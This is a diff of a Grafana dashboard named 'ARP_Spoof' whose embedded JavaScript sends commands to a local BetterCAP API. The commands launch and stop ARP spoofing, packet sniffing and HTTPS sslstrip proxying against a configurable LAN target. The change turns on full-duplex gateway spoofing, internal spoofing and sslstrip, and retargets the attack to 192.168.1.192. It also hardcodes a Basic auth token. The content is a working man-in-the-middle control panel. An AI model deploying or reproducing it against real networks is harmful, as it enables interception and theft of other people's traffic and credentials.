@@ -98,7 +98,7 @@
         },
         "sync": true,
         "update": {
-          "code": "if (response && response.ok) {\n  const commands = [\n    { cmd: `set http.proxy.sslstrip ${input_5}` },\n    { cmd: `set arp.spoof.skip_restore  ${input_4}` },\n    { cmd: `set arp.spoof.internal  ${input_3}` },\n    { cmd: `set arp.spoof.fullduplex ${input_2}` },\n    { cmd: `set arp.spoof.targets ${input_1}` },\n    { cmd: `set net.sniff.verbose true` },\n    { cmd: `set events.stream.output /tmp/bettercap/events.txt` },\n    { cmd: `net.sniff on` },\n    { cmd: `arp.spoof on` }\n\n  ];\n\n  const promises = commands.map(command => sendCommandToBetterCAP(command));\n\n  Promise.all(promises)\n    .then(() => {\n      notifySuccess(['Update', `ARP spoof start on ${input_1}.`]);\n      locationService.reload();\n    })\n    .catch(error => {\n      notifyError(['Update', error.message]);\n      console.error(error.message);\n    });\n} else {\n  notifyError(['Update', 'An error occured updating values.', error.message]);\n}\n\nfunction sendCommandToBetterCAP(command) {\n  const apiUrl = 'http://localhost:8081/api/session';\n  const token = 'dXNlcjpwYXNz';\n\n  return fetch(apiUrl, {\n    method: 'POST',\n    headers: {\n      'Authorization': `Basic ${token}`,\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(command)\n  })\n    .then(response => {\n      if (!response.ok) {\n        return response.text().then(errorText => {\n          throw new Error(`Error: ${errorText}`);\n        });\n      }\n      return response.text();\n    })\n    .catch(error => {\n      console.error('There was a problem with the fetch operation:', error.message);\n      throw error;\n    });\n}",
+          "code": "if (response && response.ok) {\n  const commands = [\n    { cmd: `set https.proxy.sslstrip ${input_5}` },\n    { cmd: `set arp.spoof.skip_restore  ${input_4}` },\n    { cmd: `set arp.spoof.internal  ${input_3}` },\n    { cmd: `set arp.spoof.fullduplex ${input_2}` },\n    { cmd: `set arp.spoof.targets ${input_1}` },\n    { cmd: `set net.sniff.verbose true` },\n    { cmd: `set events.stream.output /tmp/bettercap/events.txt` },\n    { cmd: `net.sniff on` },\n    { cmd: `arp.spoof on` }\n\n  ];\n  \n  if (`${input_5}` === \"true\") {\n    commands.push({ cmd: `https.proxy on` });\n  }\n\n  const promises = commands.map(command => sendCommandToBetterCAP(command));\n\n  Promise.all(promises)\n    .then(() => {\n      notifySuccess(['Update', `ARP spoof start on ${input_1}.`]);\n      locationService.reload();\n    })\n    .catch(error => {\n      notifyError(['Update', error.message]);\n      console.error(error.message);\n    });\n} else {\n  notifyError(['Update', 'An error occured updating values.', error.message]);\n}\n\nfunction sendCommandToBetterCAP(command) {\n  const apiUrl = 'http://localhost:8081/api/session';\n  const token = 'dXNlcjpwYXNz';\n\n  return fetch(apiUrl, {\n    method: 'POST',\n    headers: {\n      'Authorization': `Basic ${token}`,\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(command)\n  })\n    .then(response => {\n      if (!response.ok) {\n        return response.text().then(errorText => {\n          throw new Error(`Error: ${errorText}`);\n        });\n      }\n      return response.text();\n    })\n    .catch(error => {\n      console.error('There was a problem with the fetch operation:', error.message);\n      throw error;\n    });\n}",
           "confirm": false,
           "contentType": "application/json",
           "getPayload": "const payload = {};\n\nelements.forEach((element) => {\n  if (!element.value) {\n    return;\n  }\n\n  payload[element.id] = element.value;\n})\n\nreturn payload;\n\n/**\n * Data Source payload\n */ \nreturn {\n  rawSql: '',\n  format: 'table',\n};",
@@ -221,7 +221,7 @@
         },
         "sync": true,
         "update": {
-          "code": "if (response && response.ok) {\n  const commands = [\n    { cmd: `net.sniff off` },\n    { cmd: `net.recon off` },\n    { cmd: `arp.spoof off` }\n\n  ];\n\n  const promises = commands.map(command => sendCommandToBetterCAP(command));\n\n  Promise.all(promises)\n    .then(() => {\n      notifySuccess(['Update', `ARP Spoof stopped ${input_1}.`]);\n      locationService.reload();\n    })\n    .catch(error => {\n      notifyError(['Update', error.message]);\n      console.error(error.message);\n    });\n} else {\n  notifyError(['Update', 'An error occured updating values.', error.message]);\n}\n\nfunction sendCommandToBetterCAP(command) {\n  const apiUrl = 'http://localhost:8081/api/session';\n  const token = 'dXNlcjpwYXNz';\n\n  return fetch(apiUrl, {\n    method: 'POST',\n    headers: {\n      'Authorization': `Basic ${token}`,\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(command)\n  })\n    .then(response => {\n      if (!response.ok) {\n        return response.text().then(errorText => {\n          throw new Error(`Error: ${errorText}`);\n        });\n      }\n      return response.text();\n    })\n    .catch(error => {\n      console.error('There was a problem with the fetch operation:', error.message);\n      throw error;\n    });\n}",
+          "code": "if (response && response.ok) {\n  const commands = [\n    { cmd: `net.sniff off` },\n    { cmd: `net.recon off` },\n    { cmd: `arp.spoof off` }\n\n  ];\n  if (`${input_5}` === \"true\") {\n    commands.push({ cmd: `https.proxy off` });\n  }\n    const promises = commands.map(command => sendCommandToBetterCAP(command));\n\n    Promise.all(promises)\n      .then(() => {\n        notifySuccess(['Update', `ARP Spoof stopped ${input_1}.`]);\n        locationService.reload();\n      })\n      .catch(error => {\n        notifyError(['Update', error.message]);\n        console.error(error.message);\n      });\n  } else {\n    notifyError(['Update', 'An error occured updating values.', error.message]);\n  }\n\n  function sendCommandToBetterCAP(command) {\n    const apiUrl = 'http://localhost:8081/api/session';\n    const token = 'dXNlcjpwYXNz';\n\n    return fetch(apiUrl, {\n      method: 'POST',\n      headers: {\n        'Authorization': `Basic ${token}`,\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify(command)\n    })\n      .then(response => {\n        if (!response.ok) {\n          return response.text().then(errorText => {\n            throw new Error(`Error: ${errorText}`);\n          });\n        }\n        return response.text();\n      })\n      .catch(error => {\n        console.error('There was a problem with the fetch operation:', error.message);\n        throw error;\n      });\n  }",
           "confirm": false,
           "contentType": "application/json",
           "getPayload": "const payload = {};\n\nelements.forEach((element) => {\n  if (!element.value) {\n    return;\n  }\n\n  payload[element.id] = element.value;\n})\n\nreturn payload;\n\n/**\n * Data Source payload\n */ \nreturn {\n  rawSql: '',\n  format: 'table',\n};",
@@ -678,8 +678,8 @@
       {
         "current": {
           "selected": false,
-          "text": "192.168.1.94",
-          "value": "192.168.1.94"
+          "text": "192.168.1.192",
+          "value": "192.168.1.192"
         },
         "description": "A comma separated list of MAC addresses, IP addresses, IP ranges or aliases to spoof (a list of supported range formats).",
         "hide": 0,
@@ -687,20 +687,20 @@
         "name": "input_1",
         "options": [
           {
-            "selected": true,
+            "selected": false,
             "text": "127.0.0.1-80",
             "value": "127.0.0.1-80"
           }
         ],
-        "query": "192.168.1.94",
+        "query": "192.168.1.192",
         "skipUrlSync": false,
         "type": "textbox"
       },
       {
         "current": {
           "selected": false,
-          "text": "false",
-          "value": "false"
+          "text": "true",
+          "value": "true"
         },
         "description": "If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail).",
         "hide": 0,
@@ -710,12 +710,12 @@
         "name": "input_2",
         "options": [
           {
-            "selected": false,
+            "selected": true,
             "text": "true",
             "value": "true"
           },
           {
-            "selected": true,
+            "selected": false,
             "text": "false",
             "value": "false"
           }
@@ -728,8 +728,8 @@
       {
         "current": {
           "selected": false,
-          "text": "false",
-          "value": "false"
+          "text": "true",
+          "value": "true"
         },
         "description": "If true, local connections among computers of the network will be spoofed as well, otherwise only connections going to and coming from the external network.",
         "hide": 0,
@@ -739,12 +739,12 @@
         "name": "input_3",
         "options": [
           {
-            "selected": false,
+            "selected": true,
             "text": "true",
             "value": "true"
           },
           {
-            "selected": true,
+            "selected": false,
             "text": "false",
             "value": "false"
           }
@@ -786,8 +786,8 @@
       {
         "current": {
           "selected": false,
-          "text": "false",
-          "value": "false"
+          "text": "true",
+          "value": "true"
         },
         "hide": 0,
         "includeAll": false,
@@ -796,12 +796,12 @@
         "name": "input_5",
         "options": [
           {
-            "selected": false,
+            "selected": true,
             "text": "true",
             "value": "true"
           },
           {
-            "selected": true,
+            "selected": false,
             "text": "false",
             "value": "false"
           }
@@ -814,7 +814,7 @@
     ]
   },
   "time": {
-    "from": "now-15m",
+    "from": "now-5m",
     "to": "now"
   },
   "timepicker": {
@@ -835,6 +835,6 @@
   "timezone": "browser",
   "title": "ARP_Spoof",
   "uid": "cdjlzrq0g658gb",
-  "version": 30,
+  "version": 51,
   "weekStart": ""
 }
